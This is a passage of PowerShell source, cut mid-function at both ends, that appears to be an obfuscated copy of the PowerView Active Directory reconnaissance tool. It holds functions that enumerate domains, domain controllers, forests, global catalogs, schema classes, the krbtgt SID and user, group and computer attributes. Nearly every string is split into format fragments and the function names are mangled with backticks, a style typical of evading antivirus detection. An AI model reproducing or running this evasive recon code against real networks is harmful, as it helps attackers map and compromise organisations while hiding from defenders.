        if ($PSBoundParameters[( "{0}{1}{2}" -f 'Propert','ie','s')] ) { $SearcherArguments[(  "{0}{2}{1}"-f 'P','ies','ropert' )]  =   $Properties }
        if ($PSBoundParameters[(  "{1}{3}{0}{2}"-f'ageSi','Resul','ze','tP'  )]) { $SearcherArguments[( "{3}{1}{2}{4}{0}"-f 'e','su','ltPag','Re','eSiz')]  =  $ResultPageSize }
        if ($PSBoundParameters[(  "{3}{0}{2}{1}" -f'e','it','rverTimeLim','S')]  ) { $SearcherArguments[(  "{4}{2}{1}{3}{0}"-f'imit','ver','r','TimeL','Se'  )]   =   $ServerTimeLimit }
        if (  $PSBoundParameters[(  "{0}{1}{2}{3}"-f 'Cre','den','t','ial')]  ) { $SearcherArguments[( "{2}{0}{1}" -f'denti','al','Cre'  )]   = $Credential }
        $DNSSearcher   =   Get-DomainSearcher @SearcherArguments

        if ( $DNSSearcher  ) {
            if ( $PSBoundParameters[(  "{0}{1}" -f 'Find','One' )]) { $Results  = $DNSSearcher.FIndoNe(  ) }
            else { $Results  =   $DNSSearcher.FInDaLL(  ) }
            $Results |   Where-Object {$_}  |  ForEach-Object {
                try {
                    $Out  =   Convert-LDAPProperty -Properties $_.properties  |   Select-Object (  'n' + 'ame'  ),( 'dis'+ 'ting' + 'u'+'ishedname'),(  'd'+ 'n'  +'sre' +  'cord'),( 'whenc'  +  'r'+  'eated' ),('whencha'+ 'n' + 'ged')
                    $Out   |  Add-Member ('N'  +  'ote' + 'Property') ("{2}{1}{0}" -f 'e','eNam','Zon'  ) $ZoneName

                    
                    if (  $Out.dnSrECord -is [System.DirectoryServices.ResultPropertyValueCollection]  ) {
                        
                        $Record = Convert-DNSRecord -DNSRecord $Out.DNsREcoRD[0]
                    }
                    else {
                        $Record  = Convert-DNSRecord -DNSRecord $Out.dNsREcORd
                    }

                    if ($Record  ) {
                        $Record.PsOBjECT.ProPertIes   | ForEach-Object {
                            $Out   |  Add-Member ('NoteP' + 'ro'+ 'pe' +  'rty') $_.NAmE $_.valuE
                        }
                    }

                    $Out.PsOBJeCt.TYpEnAmEs.INSERT(0, ("{4}{3}{0}{1}{2}" -f 'erView.DNS','Rec','ord','ow','P' ) )
                    $Out
                }
                catch {
                    Write-Warning ('[Get-Doma' +'in' + 'DN'+  'SRe'+ 'co' +'rd] ' +'E'  +  'rror:'+  ' ' + "$_")
                    $Out
                }
            }

            if ($Results ) {
                try { $Results.dISposE(  ) }
                catch {
                    Write-Verbose ('[Ge'  + 't-D'+ 'omainDNS'  +  'Record'+ '] ' +  'Err' + 'or' +  ' '  +'d'  +  'is' +  'posing '+ 'o' +'f ' +'the'  +' ' +'Res'  +'ults'  + ' '  +  'o' +'bject'+  ': '+ "$_" )
                }
            }
            $DNSSearcher.dispOse(  )
        }
    }
}


function geT-D`oM`A`in {


    [OutputType(  [System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding(   )]
    Param( 
        [Parameter( POsiTION   = 0, ValUEFrompIPEline =   $True )]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential  = [Management.Automation.PSCredential]::EMPTY
    )

    PROCESS {
        if ( $PSBoundParameters[(  "{0}{1}{2}"-f 'Crede','nti','al' )]  ) {

            Write-Verbose (  "{8}{4}{12}{9}{1}{10}{6}{11}{3}{2}{7}{0}{5}"-f 'G','Using alt','credential','e ','Get-D','et-Domain','rna','s for ','[','ain] ','e','t','om'  )

            if ( $PSBoundParameters[(  "{1}{0}" -f 'in','Doma')] ) {
                $TargetDomain =  $Domain
            }
            else {
                
                $TargetDomain   =  $Credential.GetnETwOrkCREDeNtIAL(   ).DoMaIN
                Write-Verbose ( '[Ge'+'t-Doma'+'i'+ 'n] ' +'Extra'  +  'c'+  'ted '  +'do'+ 'main' +' '  +  "'$TargetDomain' "  +'from' +  ' ' +  '-C'  + 'redentia'  +  'l')
            }

            $DomainContext = New-Object ( 'Syste' +  'm' + '.DirectoryServices.Activ'+'e' +'Directory.Dir' +'e'  +'ctor'  + 'yC'+ 'ont' +  'ext' )( (  "{2}{1}{0}"-f 'n','i','Doma'  ), $TargetDomain, $Credential.USErNAME, $Credential.GetNetWORkCreDeNTIAL(  ).PAsswOrD )

            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GETdOMaiN($DomainContext)
            }
            catch {
                Write-Verbose ( '[Ge'+ 't-Dom'+ 'ai'+  'n]'+  ' '+ 'Th' +  'e ' + 'speci' +  'fi' +'ed ' +  'do'+ 'm' +'ain ' + "'$TargetDomain' "  +'d' +  'oes '  +'n'+  'ot '  + 'e' +  'xi' +'st, '+  'could'+  ' '  + 'n'+'ot '  +  'be' +  ' '  +  'conta'+ 'cte'+ 'd'  +  ', '+ 'th' +  'ere '  +(  'isnYci'+  't ').REPlACE( (  [Char]89  + [Char]99+ [Char]105),[sTriNG][Char]39 ) +'a'  + 'n '  +  'existing' + ' '  +'trus'  + 't, '  +'o'  + 'r ' +  't'  + 'he ' + 'sp' +'ecif' +'ie'  + 'd ' +  'c'+ 'reden'+ 'tials '+ 'are' +  ' '  + 'inv'+ 'alid: ' + "$_" )
            }
        }
        elseif (  $PSBoundParameters[( "{1}{0}" -f 'ain','Dom'  )]) {
            $DomainContext  =  New-Object ( 'Syst'+  'em.D'+  'irectoryServ' +  'i'  +  'ces.ActiveD'  + 'i' + 'r' +'ectory.Dir' +  'ecto'  +'r'+'y'+'Co'  +  'ntex' +  't'  )(  ("{1}{0}" -f 'main','Do'  ), $Domain )
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::gETdOmAIN(  $DomainContext  )
            }
            catch {
                Write-Verbose ( '[Ge'  +'t'  +  '-Domain'  +  '] '+'The'+' '+  'specifi' +'e'  +  'd '+ 'd' + 'omai'+  'n ' +  "'$Domain' " +'do' +  'es '  +  'not'  + ' '+'exist'  +  ', '+'c' +  'ould '+'not'  + ' '  + 'b'  + 'e ' + 'con'+  't' + 'acte'+ 'd, '  +'o'+  'r '+ 'ther'+'e '+ ( 'i' +'sn' +  '{0' + '}t ')-f[CHaR]39  +'an'  + ' '  +  'exi'  + 'sti'  + 'ng ' + 't'  + 'rust '  + ': ' +"$_" )
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::gETCuRreNTDoMaIN(  )
            }
            catch {
                Write-Verbose (  '[Ge'  +  't-Domain' +  '] '  + 'E'  +  'rror '  +'retriev'  +  'ing'  +  ' '+'th'+'e ' +'c'  +'urrent '+'do'  + 'mai'+'n: ' + "$_" )
            }
        }
    }
}


function GEt`-doMAin`conTr`oLL`ER {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{0}{1}{2}"-f 'PSShould','Proc','ess'}, '' )]
    [OutputType(  {"{1}{0}{4}{2}{3}" -f 'mp','PowerView.Co','te','r','u'}  )]
    [OutputType(  {"{10}{14}{7}{12}{1}{15}{13}{4}{16}{2}{6}{11}{5}{9}{0}{8}{3}" -f'ma','es.Ac','ire','ler','v','y.D','cto','re','inControl','o','Syste','r','ctoryServic','i','m.Di','t','eD'})]
    [CmdletBinding( )]
    Param(  
        [Parameter( Position  =   0, ValUefROMPIPEliNe  =  $True  )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty( )]
        [Alias( {"{3}{2}{1}{0}{4}" -f'ntrol','o','inC','Doma','ler'}  )]
        [String]
        $Server,

        [Switch]
        $LDAP,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential  =  [Management.Automation.PSCredential]::eMptY
     )

    PROCESS {
        $Arguments   =   @{}
        if ( $PSBoundParameters[(  "{0}{1}" -f'Doma','in'  )]  ) { $Arguments[("{1}{0}"-f'ain','Dom'  )]  =   $Domain }
        if (  $PSBoundParameters[( "{1}{0}{2}" -f 'denti','Cre','al' )]) { $Arguments[( "{2}{3}{0}{1}" -f'edent','ial','C','r'  )] = $Credential }

        if (  $PSBoundParameters[("{1}{0}" -f 'DAP','L' )] -or $PSBoundParameters[("{1}{0}" -f 'rver','Se'  )]  ) {
            if ( $PSBoundParameters[( "{2}{0}{1}" -f'v','er','Ser' )] ) { $Arguments[("{2}{1}{0}" -f'r','rve','Se'  )]   =   $Server }

            
            $Arguments[(  "{2}{1}{0}" -f'r','ilte','LDAPF')] = ( ("{5}{6}{3}{7}{2}{1}{0}{4}" -f '803','1.4.','6.','trol:1.2.840.113',':=8192)','(userA','ccountCon','55'  )  )

            Get-DomainComputer @Arguments
        }
        else {
            $FoundDomain =  Get-Domain @Arguments
            if ( $FoundDomain ) {
                $FoundDomain.DOmaiNcontROLLeRS
            }
        }
    }
}


function gEt`-`FOr`Est {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{0}{3}{4}{1}{2}"-f'P','ouldProces','s','S','Sh'}, ''  )]
    [OutputType( {"{7}{1}{5}{11}{9}{3}{10}{4}{2}{0}{6}{8}"-f'je','stem.Manageme','Ob','ation.PS','tom','nt','c','Sy','t','Autom','Cus','.'} )]
    [CmdletBinding(    )]
    Param( 
        [Parameter( PosiTioN  =   0, ValUeFRoMpIPeLINE   =  $True)]
        [ValidateNotNullOrEmpty( )]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute( )]
        $Credential =   [Management.Automation.PSCredential]::EmPtY
     )

    PROCESS {
        if ($PSBoundParameters[("{2}{3}{1}{0}" -f 'tial','en','C','red' )]  ) {

            Write-Verbose ( "{2}{1}{4}{3}{7}{5}{0}{10}{8}{6}{9}" -f 'g','Get-Fore','[','t] Us','s','n','e credentials f','i','lternat','or Get-Forest',' a')

            if ($PSBoundParameters[(  "{0}{1}" -f'Fore','st')]  ) {
                $TargetForest =   $Forest
            }
            else {
                
                $TargetForest   = $Credential.GEtnETWOrKcrEdENtIaL(  ).dOmaiN
                Write-Verbose ( '[G'+ 'et-For'+  'est] '+  'Extr'  +'acte' + 'd '  +'doma'  +  'in '  +  "'$Forest' "  +  'fro'  + 'm '+ '-Cre'+  'den'  +'tial')
            }

            $ForestContext   = New-Object (  'Sy'+'stem.D' + 'ir' +  'ec'+ 'to'+ 'ry'  + 'Services.Ac' + 'tiveDire'+  'cto' +'ry.D' + 'i'+'rectory' +  'C' +'ontext' )( (  "{1}{0}" -f'orest','F' ), $TargetForest, $Credential.USERnaME, $Credential.GEtnetworKCReDenTIAl(   ).pasSwORD )

            try {
                $ForestObject   =  [System.DirectoryServices.ActiveDirectory.Forest]::GEtForEST($ForestContext  )
            }
            catch {
                Write-Verbose ( '[Get'  + '-' +'Fore'+ 'st] ' +  'Th'  +  'e ' + 'spe'  +'cif'  +'ied '  +  'f' +'ore'+ 'st ' +  "'$TargetForest' "+'does'+ ' '  + 'no'+ 't '+  'ex' + 'ist,'+ ' ' + 'cou' + 'ld ' + 'not' + ' '+  'b'+  'e '  + 'contacte' +'d,'+  ' '+'th'+  'ere '  + ((  'isn'  + 'ftbt'  + ' ') -cRePlACe ([chAr]102  +  [chAr]116+[chAr]98),[chAr]39  )  +  'an'  +' '  + 'e'  + 'xi'  + 'sting '+  'tru'  +  'st, '  + 'o'+ 'r ' +  't'+ 'he '+'specif'+ 'ied'  +  ' ' +  'cre' +  'd'+ 'entials'  +  ' ' +  'a'+'re '+  'inv'+'alid'+  ': '+  "$_" )
                $Null
            }
        }
        elseif (  $PSBoundParameters[("{0}{1}{2}" -f'Fo','r','est'  )]) {
            $ForestContext  =   New-Object (  'System.Directo' +'r'+'ySe'+'r' +'vice' +'s.A'+  'ct' + 'iveDir'  + 'ect'  +  'or' +'y.Dir'+ 'ector' +'yC'+  'onte'  +  'xt' )( (  "{1}{0}"-f'rest','Fo'  ), $Forest)
            try {
                $ForestObject  =  [System.DirectoryServices.ActiveDirectory.Forest]::GEtforeSt($ForestContext  )
            }
            catch {
                Write-Verbose ('['  +'Get'+'-Fore' +  'st]'  + ' '  + 'T' + 'he '+  's'  + 'pe'  +  'ci'  +  'fied '+'for' +'est'+  ' ' +"'$Forest' "+'d' +'oes '  +'no' +'t '+'ex'  +  'ist' + ', '+  'cou' +  'ld '  +'n' +  'ot ' +'be'  +' '  + 'cont'  +'ac'+  'ted, ' +'o' +'r '  + 't'+'here '  +('isn'  + '{0}'+ 't'+  ' ' ) -f  [cHAR]39  +  'a'+ 'n '+ 'e'+ 'xisti' +  'ng '  +'tr' +  'ust: '  +"$_"  )
                return $Null
            }
        }
        else {
            
            $ForestObject   =   [System.DirectoryServices.ActiveDirectory.Forest]::getCuRRentfOResT(   )
        }

        if ( $ForestObject ) {
            
            if ($PSBoundParameters[("{1}{2}{0}" -f'ntial','Cre','de' )]  ) {
                $ForestSid   =  ( Get-DomainUser -Identity (  "{0}{1}"-f 'krbtg','t' ) -Domain $ForestObject.roOtDoMAIN.nAmE -Credential $Credential ).ObJeCTSid
            }
            else {
                $ForestSid   =   (Get-DomainUser -Identity ("{1}{0}" -f 'gt','krbt'  ) -Domain $ForestObject.rootDOmaIn.NAME ).objECTsiD
            }

            $Parts  =  $ForestSid -Split '-'
            $ForestSid  = $Parts[0..$($Parts.LEnGTH-2 )] -join '-'
            $ForestObject  |  Add-Member ('Note'  + 'Pro' +  'p'  + 'erty'  ) ("{3}{4}{2}{1}{0}"-f'id','S','tDomain','R','oo' ) $ForestSid
            $ForestObject
        }
    }
}


function Get-FOR`E`St`d`omaiN {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{3}{1}"-f 'ould','ocess','PSSh','Pr'}, '')]
    [OutputType(  {"{0}{9}{1}{12}{4}{14}{11}{3}{10}{7}{13}{2}{8}{6}{5}" -f'Sy','rySe','.','Activ','ice','n','omai','o','D','stem.Directo','eDirect','.','rv','ry','s'} )]
    [CmdletBinding( )]
    Param( 
        [Parameter(pOSiTION  =   0, VAlUEFroMpiPeline  = $True  )]
        [ValidateNotNullOrEmpty( )]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential =   [Management.Automation.PSCredential]::EMpTy
     )

    PROCESS {
        $Arguments  =   @{}
        if ($PSBoundParameters[("{1}{0}"-f 't','Fores')]  ) { $Arguments[( "{1}{0}"-f'rest','Fo')]  =   $Forest }
        if (  $PSBoundParameters[( "{2}{1}{3}{0}" -f 'ential','re','C','d')] ) { $Arguments[(  "{0}{2}{1}" -f'Crede','l','ntia')]  = $Credential }

        $ForestObject  =   Get-Forest @Arguments
        if ( $ForestObject  ) {
            $ForestObject.dOMainS
        }
    }
}


function gET-F`O`RE`stgLoBAlcata`l`oG {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{0}{4}{3}{2}{1}"-f 'P','ess','Proc','hould','SS'}, '')]
    [OutputType(  {"{0}{4}{8}{6}{9}{3}{5}{2}{7}{10}{1}" -f 'Syst','og','tory.Glo','es.Activ','e','eDirec','yServi','b','m.Director','c','alCatal'})]
    [CmdletBinding(    )]
    Param( 
        [Parameter( PosiTiON =   0, vALuefrOmpiPeline  =   $True  )]
        [ValidateNotNullOrEmpty(   )]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute( )]
        $Credential  =   [Management.Automation.PSCredential]::EMPTy
    )

    PROCESS {
        $Arguments   =  @{}
        if ($PSBoundParameters[("{0}{2}{1}"-f'Fo','st','re')]) { $Arguments[("{1}{0}"-f'rest','Fo')]   =   $Forest }
        if ( $PSBoundParameters[("{1}{0}{2}" -f'ed','Cr','ential')] ) { $Arguments[("{0}{2}{1}{3}"-f 'Cred','nt','e','ial'  )]  =  $Credential }

        $ForestObject  = Get-Forest @Arguments

        if (  $ForestObject ) {
            $ForestObject.FINdAlLGlObalCaTALoGs(   )
        }
    }
}


function GeT-F`oR`EStsChE`macL`A`sS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{0}{3}{2}{1}" -f'PSS','rocess','P','hould'}, '')]
    [OutputType( [System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding(  )]
    Param( 
        [Parameter(  pOSition   =  0, valUEFROMpiPELiNe  = $True  )]
        [Alias({"{0}{1}"-f'Cl','ass'} )]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ClassName,

        [Alias( {"{1}{0}"-f 'e','Nam'} )]
        [ValidateNotNullOrEmpty(   )]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute( )]
        $Credential  =   [Management.Automation.PSCredential]::eMPTy
    )

    PROCESS {
        $Arguments   =   @{}
        if (  $PSBoundParameters[( "{0}{1}" -f 'Fore','st' )]) { $Arguments[(  "{2}{0}{1}"-f 'e','st','For'  )]  =  $Forest }
        if (  $PSBoundParameters[( "{0}{1}{2}"-f 'Creden','t','ial' )] ) { $Arguments[(  "{1}{0}{2}"-f 'edentia','Cr','l')]   =   $Credential }

        $ForestObject   = Get-Forest @Arguments

        if ($ForestObject) {
            if ( $PSBoundParameters[( "{0}{1}{2}"-f'C','l','assName'  )] ) {
                ForEach (  $TargetClass in $ClassName) {
                    $ForestObject.ScHEMa.FINdclAss(  $TargetClass )
                }
            }
            else {
                $ForestObject.scHeMA.FinDallCLaSsEs( )
            }
        }
    }
}


function F`iND-D`oMAINob`JecTpro`perty`O`U`TlIer {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{2}{0}{1}{4}"-f'Sh','oul','S','P','dProcess'}, '')]
    [OutputType({"{1}{6}{5}{2}{3}{0}{4}"-f 'Outl','P','rVie','w.Property','ier','e','ow'})]
    [CmdletBinding(dEfauLTpArAMEtERsEtnamE   =  {"{1}{2}{0}" -f 'Name','Clas','s'} )]
    Param(  
        [Parameter(posiTioN   = 0, maNDATOrY =   $True, PARameterSEtnaME =   "CLA`ss`NAMe" )]
        [Alias( {"{1}{0}" -f 's','Clas'} )]
        [ValidateSet({"{1}{0}"-f'ser','U'}, {"{1}{0}"-f 'roup','G'}, {"{1}{0}{2}" -f'mpu','Co','ter'} )]
        [String]
        $ClassName,

        [ValidateNotNullOrEmpty(  )]
        [String[]]
        $ReferencePropertySet,

        [Parameter(vaLuefrOMpipElInE  =  $True, MaNdatORY  =  $True, PARAMETeRsETnAmE  = "rEFEr`eNcE`o`BJEcT" )]
        [PSCustomObject]
        $ReferenceObject,

        [ValidateNotNullOrEmpty(   )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty(  )]
        [Alias({"{1}{0}{2}"-f'te','Fil','r'} )]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty(  )]
        [Alias( {"{1}{0}{2}"-f 'Pat','ADS','h'}  )]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty(    )]
        [Alias({"{2}{0}{1}{4}{3}"-f'ma','i','Do','ller','nContro'} )]
        [String]
        $Server,

        [ValidateSet(  {"{0}{1}" -f 'Ba','se'}, {"{2}{0}{1}" -f'eLeve','l','On'}, {"{0}{1}"-f 'Subt','ree'})]
        [String]
        $SearchScope   =   (  "{1}{0}{2}"-f 'tr','Sub','ee'  ),

        [ValidateRange(1, 10000 )]
        [Int]
        $ResultPageSize   =  200,

        [ValidateRange( 1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(   )]
        $Credential  =   [Management.Automation.PSCredential]::EmPtY
     )

    BEGIN {
        $UserReferencePropertySet = @((  "{1}{0}{2}"-f'd','a','mincount' ),("{4}{0}{2}{1}{3}"-f 'n','xpir','te','es','accou' ),("{3}{0}{4}{1}{2}"-f'adpas','or','dtime','b','sw'),(  "{2}{1}{0}"-f'dcount','adpw','b'  ),'cn',("{0}{2}{1}" -f 'code','ge','pa'  ),("{1}{2}{0}"-f 'e','c','ountrycod' ),(  "{0}{2}{1}"-f'd','ption','escri'  ), ("{1}{2}{0}"-f 'ayname','disp','l' ),( "{3}{0}{1}{2}{4}"-f's','tinguished','n','di','ame'),( "{4}{5}{1}{3}{2}{0}" -f'ondata','paga','i','t','dsco','repro' ),("{1}{0}{2}"-f 've','gi','nname'  ),("{1}{2}{3}{0}"-f 'etype','insta','n','c' ),(  "{2}{0}{1}{3}{4}"-f'scriticalsyst','e','i','mo','bject'  ),("{1}{0}{2}" -f'log','last','off' ),( "{0}{1}{2}"-f'lastl','og','on'),(  "{3}{2}{0}{1}"-f'imestam','p','logont','last'),(  "{3}{0}{2}{1}" -f'tt','e','im','lockou'),(  "{2}{1}{0}" -f 'oncount','og','l'),(  "{2}{0}{1}"-f 'e','rof','memb'),( "{4}{6}{1}{3}{5}{0}{2}"-f'ont','porteden','ypes','cr','m','ypti','sds-sup' ),("{1}{0}"-f'e','nam'),( "{0}{1}{3}{2}{4}"-f 'ob','j','ego','ectcat','ry'),( "{2}{1}{0}"-f'lass','tc','objec' ),("{1}{2}{0}" -f'ctguid','o','bje' ),(  "{1}{2}{0}" -f 'd','objects','i'  ),( "{3}{2}{4}{0}{1}" -f 'p','id','gr','primary','ou' ),("{3}{0}{2}{1}" -f 'dlasts','t','e','pw'),( "{4}{2}{3}{0}{1}" -f 't','name','mac','coun','sa'  ),( "{1}{2}{0}"-f'pe','samaccoun','tty'  ),'sn',( "{4}{1}{0}{2}{3}"-f'co','serac','untc','ontrol','u'),("{3}{1}{0}{2}" -f 'alnam','erprincip','e','us'),("{0}{2}{1}"-f 'us','nged','ncha'),( "{1}{0}{2}" -f'te','usncrea','d'  ),( "{0}{2}{1}" -f'when','d','change' ),( "{2}{0}{1}"-f'ncre','ated','whe' ))

        $GroupReferencePropertySet   =  @((  "{0}{2}{1}"-f 'adm','nt','incou'  ),'cn',("{1}{3}{2}{0}"-f 'on','de','cripti','s' ),(  "{2}{3}{0}{1}"-f'hedna','me','d','istinguis' ),( "{1}{6}{2}{3}{4}{5}{0}"-f 'a','dscore','opagat','ion','d','at','pr'  ),("{0}{2}{1}"-f 'gr','pe','oupty'),( "{0}{2}{1}" -f'i','type','nstance' ),( "{3}{1}{0}{2}" -f 'obje','alsystem','ct','iscritic'  ),( "{0}{1}" -f 'membe','r' ),(  "{1}{0}{2}" -f'be','mem','rof'),( "{0}{1}"-f 'n','ame'),( "{1}{0}{2}" -f 'tcate','objec','gory' ),(  "{0}{2}{1}" -f 'object','ss','cla'  ),("{3}{0}{1}{2}"-f 'bject','gui','d','o' ),("{0}{1}{2}" -f'o','bjects','id' ),( "{3}{1}{0}{2}" -f 'a','tn','me','samaccoun'  ),(  "{0}{2}{1}{3}{4}"-f'sa','cc','ma','ountt','ype'  ),(  "{3}{2}{0}{1}"-f'ag','s','stemfl','sy'  ),(  "{1}{2}{3}{0}" -f 'anged','usn','c','h'),( "{0}{1}{2}" -f'us','ncre','ated' ),("{2}{0}{1}"-f 'han','ged','whenc'  ),( "{2}{0}{3}{1}" -f'encre','ed','wh','at') )

        $ComputerReferencePropertySet   =  @(( "{0}{2}{1}" -f 'accounte','s','xpire' ),( "{2}{1}{0}"-f 'dtime','asswor','badp' ),( "{2}{0}{1}" -f'pwdc','ount','bad' ),'cn',( "{0}{1}"-f'cod','epage'),( "{1}{2}{0}"-f'rycode','c','ount'  ),(  "{3}{1}{4}{2}{0}"-f 'edname','ti','h','dis','nguis'  ),(  "{0}{1}{2}" -f 'd','nsho','stname' ),(  "{1}{5}{3}{0}{2}{4}"-f'opa','d','gation','epr','data','scor'),( "{3}{1}{0}{2}" -f'c','nstan','etype','i'  ),(  "{0}{3}{2}{1}" -f'iscrit','systemobject','cal','i'  ),( "{0}{1}{2}" -f'l','astlog','off'),(  "{2}{0}{1}" -f 'as','tlogon','l' ),( "{3}{1}{0}{2}{4}"-f 'tlogontimest','as','a','l','mp'),( "{1}{0}{3}{4}{2}"-f 'oc','l','flags','al','policy' ),(  "{3}{2}{1}{0}" -f'count','on','og','l'  ),("{5}{0}{2}{6}{1}{4}{7}{8}{3}"-f 'sds-su','tede','ppo','es','ncrypti','m','r','on','typ'  ),("{1}{0}"-f 'ame','n'),("{1}{3}{2}{0}" -f'ry','obj','catego','ect'),( "{2}{0}{1}" -f'las','s','objectc'  ),( "{2}{1}{0}"-f'guid','t','objec'  ),("{2}{1}{0}" -f'd','tsi','objec'  ),( "{1}{0}{2}{3}{4}" -f'ti','opera','ngsyst','e','m'),("{2}{3}{0}{5}{1}{6}{4}"-f'ng','ys','oper','ati','servicepack','s','tem'),("{3}{0}{2}{6}{1}{5}{4}" -f'per','gs','at','o','mversion','yste','in' ),( "{4}{3}{0}{2}{1}" -f'ygr','pid','ou','rimar','p'),("{2}{1}{0}" -f'set','st','pwdla'),( "{0}{2}{1}" -f'sa','ntname','maccou' ),(  "{3}{1}{2}{0}" -f'e','amaccountt','yp','s' ),( "{2}{0}{3}{1}" -f'iceprin','lname','serv','cipa'),("{4}{5}{2}{1}{0}{3}"-f 't','on','untc','rol','us','eracco'),("{3}{1}{0}{2}"-f 'e','g','d','usnchan'),(  "{0}{2}{1}"-f'usnc','ted','rea' ),("{2}{0}{1}"-f'nge','d','whencha'),("{1}{0}{2}"-f'he','w','ncreated'  )  )

        $SearcherArguments   =   @{}
        if (  $PSBoundParameters[( "{1}{0}"-f'omain','D'  )] ) { $SearcherArguments[(  "{0}{1}"-f 'Dom','ain' )] =  $Domain }
        if ( $PSBoundParameters[(  "{0}{2}{1}"-f'L','er','DAPFilt'  )]  ) { $SearcherArguments[(  "{0}{1}{2}"-f'LDAPF','il','ter' )]   = $LDAPFilter }
        if ($PSBoundParameters[(  "{1}{0}{2}"-f 'hBa','Searc','se' )] ) { $SearcherArguments[( "{1}{2}{0}{3}" -f 'ar','S','e','chBase')]   =  $SearchBase }
        if ($PSBoundParameters[(  "{0}{1}" -f 'Se','rver' )]) { $SearcherArguments[("{0}{1}" -f'S','erver' )]  =   $Server }
        if ( $PSBoundParameters[(  "{0}{2}{1}" -f 'Sear','cope','chS')]) { $SearcherArguments[( "{2}{1}{0}"-f 'Scope','earch','S'  )]  =   $SearchScope }
        if ( $PSBoundParameters[("{2}{1}{0}" -f 'ltPageSize','u','Res')] ) { $SearcherArguments[( "{2}{3}{1}{0}" -f'eSize','ag','Resul','tP' )] =   $ResultPageSize }
        if ( $PSBoundParameters[( "{0}{1}{4}{3}{2}" -f'S','e','meLimit','rTi','rve' )]  ) { $SearcherArguments[("{2}{4}{1}{0}{3}" -f'verTime','r','S','Limit','e'  )]   =   $ServerTimeLimit }
        if ( $PSBoundParameters[("{0}{1}{3}{2}" -f'Tomb','sto','e','n')] ) { $SearcherArguments[(  "{0}{1}" -f 'Tombs','tone'  )]   = $Tombstone }
        if ($PSBoundParameters[( "{1}{2}{0}" -f'l','Cr','edentia')]  ) { $SearcherArguments[( "{2}{0}{1}" -f 'r','edential','C')]  = $Credential }

        
        if ( $PSBoundParameters[(  "{1}{0}" -f'ain','Dom' )] ) {
            if ($PSBoundParameters[( "{3}{0}{1}{2}"-f'i','a','l','Credent')] ) {
                $TargetForest  = Get-Domain -Domain $Domain |  Select-Object -ExpandProperty (  'F' +  'ores' + 't')   |   Select-Object -ExpandProperty ( 'Na'+ 'me' )
            }
            else {
                $TargetForest = Get-Domain -Domain $Domain -Credential $Credential   |   Select-Object -ExpandProperty (  'F'+'o'  +'rest' )   |   Select-Object -ExpandProperty (  'N'+ 'ame'  )
            }
            Write-Verbose ( '[F' +'ind' +  '-Dom' +'ainObj' +'ectPr'+  'op' +'erty'  + 'Outl'  +  'ie'  +  'r]'  +' '+  'En'+ 'umerate'+'d '  +  'f'+ 'orest ' + "'$TargetForest' "+'f'  +'or '  +  'ta' +'rget'  + ' '  +'do'+ 'main' + ' ' +  "'$Domain'" )
        }

        $SchemaArguments =  @{}
        if ( $PSBoundParameters[( "{2}{1}{0}{3}"-f'e','ed','Cr','ntial'  )]) { $SchemaArguments[( "{0}{1}{2}" -f'Cre','dent','ial' )]   =  $Credential }
        if ($TargetForest ) {
            $SchemaArguments[("{1}{0}"-f'rest','Fo'  )] = $TargetForest
        }
    }

    PROCESS {

        if ( $PSBoundParameters[(  "{5}{3}{0}{4}{2}{1}"-f'n','tySet','per','fere','cePro','Re')] ) {
            Write-Verbose ("{4}{3}{13}{0}{10}{1}{14}{9}{5}{7}{12}{8}{2}{11}{6}" -f 'bj','tPro','eP','ind-Doma','[F','U','pertySet','s','pecified -Referenc','lier] ','ec','ro','ing s','inO','pertyOut'  )
            $ReferenceObjectProperties   =  $ReferencePropertySet
        }
        elseif ( $PSBoundParameters[(  "{1}{3}{2}{0}"-f 'ceObject','Re','eren','f' )] ) {
            Write-Verbose ( "{24}{19}{18}{23}{21}{14}{17}{5}{13}{20}{7}{9}{27}{16}{12}{15}{1}{8}{22}{3}{4}{26}{0}{2}{6}{11}{10}{25}"-f'ject to use as the refer',' ','e','e','fere','ctPropertyOutli','nce p','] ','names from ','E','p','ro','ing proper','e','b','ty','t','je','om','D','r','inO','-R','a','[Find-','erty set','nceOb','xtrac' )
            $ReferenceObjectProperties  = Get-Member -InputObject $ReferenceObject -MemberType (  'N'+ 'otePr' +'op' +  'erty' )   |   Select-Object -Expand ('N'+ 'ame'  )
            $ReferenceObjectClass  = $ReferenceObject.oBjECTcLaSs  |  Select-Object -Last 1
            Write-Verbose ('[Find'  +'-Domain'  + 'O'  +'bj'+  'ectPr'  +  'opertyOutli'+ 'e'+'r] ' +  'Calcu' + 'lated' +' ' +'Re' +'ferenceObjectC'+'l' +'a' + 'ss '  + ': '  +"$ReferenceObjectClass" )
        }
        else {
